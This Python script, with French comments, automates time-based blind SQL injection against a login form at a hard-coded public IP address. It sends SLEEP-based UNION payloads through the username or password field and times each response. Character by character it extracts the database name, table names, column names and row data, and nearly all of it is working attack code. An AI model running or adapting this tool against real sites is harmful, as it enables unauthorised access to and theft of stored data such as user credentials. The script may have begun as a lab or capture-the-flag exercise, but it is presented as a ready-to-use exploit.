import requests
import time

def db_name():
    global usr
    usr = "idc"
    global dictionary
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    global nbr 
    nbr = ""
    global url
    url = "http://51.15.136.118/login.php"
    # sert à déterminer si c'est username qui est vulnérable ou password
    global vulnerable_input
    vulnerable_input = True
    
    a=0
    db = []
    texte = ""
    TIME = 5

    # cherche le nombre de colonne que va utiliser la requête sql (juste username + password donc 2)
    for letter in dictionary:
        for num in range(1, 10):
            nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
            payload = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': payload})
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                nbr = nums
                break
        if total_time >= TIME:
            break 
    # Si le payload dans le champ password ne fonctionne pas, tester sur le champ username pour savoir si il est vulnérable
    if nbr == "":
        for letter in dictionary:
            for num in range(1, 10):
                nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
                payload = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
                start_time = time.time()
                response = requests.post(url, data={'username': payload, 'password': usr})
                end_time = time.time()
                total_time = end_time - start_time
                if total_time >= TIME:
                    nbr = nums
                    break
            if total_time >= TIME:
                break 

        if nbr != "":
            vulnerable_input = False
            print(vulnerable_input)

    if nbr == "":
        print("Pas de base de données trouvées")
        exit()

    # Cherche le nom de la base de données que le formulaire de connexion utilise
    for i in range(1, 20):
        for j in range(0, len(dictionary)):
            payload = "' UNION SELECT SLEEP(5)" + nbr + " where database() like '" + texte + dictionary[j] + "%' -- "
            start_time = time.time()
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': payload, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': payload})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1

            if a > 37:
                break

            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break

    db.append(texte)

    # Affiche la ou les base de données trouvées
    b=0
    for x in db:
        b += 1
        print("Database {} : {} ".format(b, x))

    c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(db[c-1]))
    time.sleep(5)
    final_db=""
    jsp = final_db + "".join(db[c-1])
    return jsp


def table_name(database):
    tables_name = []
    a = 0
    texte = ""
    TIME = 5
    
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 37:
                if texte != "":
                    # Comme c'est une requêt sql qui utilise un dictionnaire, si on enlève pas la première lettre cela va toujours retombé sur le même mot
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    tables_name.append(texte)
                    print(tables_name)
                    texte = ""
                    a = 0
                    break
                else:
                    break
            payload = "' UNION SELECT SLEEP(5)" + nbr + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
                      
            # Mesure le temps de la réponse du site web avec le temps donné dans la requête
            start_time = time.time()
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': payload, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': payload})
            end_time = time.time()
            total_time = end_time - start_time
            
            a += 1
            if total_time >= TIME:
                texte += dictionary[j]
                i += 1
                j = 0
                a = 0
                break
    
    # Affiche les tables trouvées et demande sur laquelle l'utilisateur veut continuer
    b = 0
    for x in tables_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la table sur laquelle vous voulez continuer : "))
    print("Vous avez choisi la table {}. ".format(tables_name[c-1]))
    time.sleep(5)
    
    
    final_db = ""
    jsp2 = final_db + "".join(tables_name[c-1])
    
    return jsp2


def column_name(database, nom_table):
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    global columns_name
    columns_name = []
    a = 0
    texte = ""
    TIME = 5
    # boucle principale pour tester les noms de colonnes
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            # Si le compteur a atteint une certaine valeur, on ajoute le nom de colonne testé à la liste des noms de colonnes
            if a > 37:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    columns_name.append(texte)
                    print(columns_name)
                    texte = ""
                    a = 0
                    break
                else:
                    break
            
            # Requête SQL pour récupérer les noms de colonnes de la table cible
            payload = "' UNION SELECT SLEEP(5)" + nbr + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
            
            # Envoi de la requête et mesure du temps de réponse
            start_time = time.time()
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': payload, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': payload})
            end_time = time.time()
            total_time = end_time - start_time
            
            # Incrémentation du compteur et mise à jour de la chaîne de caractères utilisée pour construire les noms de colonnes
            a += 1
            
            # Si la requête a pris plus de temps que le temps d'attente fixé, on ajoute le caractère testé à la chaîne de caractères
            if total_time >= TIME:
                texte += dictionary[j]
                i += 1
                j = 0
                a = 0
                break
    
    # Affichage des noms de colonnes testés
    b = 0
    for x in columns_name:
        b += 1
        print("Colonne {} : {} ".format(b, x))
        time.sleep(5)
    
    return columns_name


def trouver_tab0(nom_table):
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    tab = columns_name
    texte = ""
    TIME = 5
    a = 0
    idk = []
    for i in range(1, 10):
        for j in range(0, len(dictionary)):
            if a > 37:
                if texte != "":
                    # On retire le premier caractère de la chaîne
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    idk.append(texte)                   
                    a=0
                    texte = ""
                    break
            # Mesure du temps d'exécution de la requête
            start_time = time.time()
            # Création de la requête SQL injectée avec le nom de table, le nom de colonne et les caractères testés
            payload = "' UNION SELECT SLEEP(5)" + nbr + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': payload, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': payload})
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                texte += dictionary[j]
                # Affichage des noms de tab[0] trouvés
                print(texte)
                a=0
            
            a +=1
    # Retourne la liste de noms de colonnes trouvés
    return idk


def dump_columns(nom, tab0, column_name):
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    tab = column_name
    nom_colonne = tab0
    texte = ""
    TIME = 5
    a = 0
    z=0
    # Initialisation d'une liste vide pour stocker les résultats
    idk = []

    while z <= (len(tab)):
        z += 1
        for x in nom_colonne:
            # Conversion de l'indice de colonne en entier
            x = int(x)
            for i in range (1,30):
                for j in range(0, len(dictionary)):
                    if a > 37:
                        # Si la chaîne n'est pas vide, on ajoute son contenu à la liste des résultats
                        if texte != "":
                            print(texte)
                            idk.append(texte)
                            a=0
                            texte = ""
                            # Si tous les indices des colonnes n'ont pas encore été parcourus, on passe à la colonne suivante
                            if x < len(nom_colonne):
                                x += 1
                            # Si toutes les colonnes ont été parcourues, on passe à la table suivante
                            elif z < len(tab)-1:
                                x = 1
                                z += 1
                            # Si tous les résultats ont été récupérés, on affiche le résultat final et on quitte la fonction
                            else:
                                c = len(idk)
                                d = c//2
                                a=idk[d:]
                                b=idk[:d]
                                print(tab)
                                for j in range(len(nom_colonne)):
                                    print(" {} : {} : {} ".format(nom_colonne[j], b[j], a[j]))
                                quit()
                            break
                        else:
                            break

                    start_time = time.time()
                    # Requête SQL injectée pour récupérer les données
                    payload = "' UNION SELECT SLEEP(5)" + nbr + " "" " + tab[0] + " FROM " + nom + " WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
                    # Envoi de la requête HTTP
                    if vulnerable_input == False:   
                        response = requests.post(url, data={'username': payload, 'password': usr})
                    else:
                        response = requests.post(url, data={'username': usr, 'password': payload})
                    end_time = time.time()
                    total_time = end_time - start_time
                    a+=1
                    if total_time >= TIME:
                        texte += dictionary[j]
                        a=0
                        j=0
                        i+=1
                        break


if __name__ == "__main__":
    nom_base_de_donnée = db_name()
    nom_table = table_name(nom_base_de_donnée)
    nom_colonne = column_name(nom_base_de_donnée, nom_table)
    tab0 = trouver_tab0(nom_table)
    param = dump_columns(nom_table, tab0, nom_colonne)
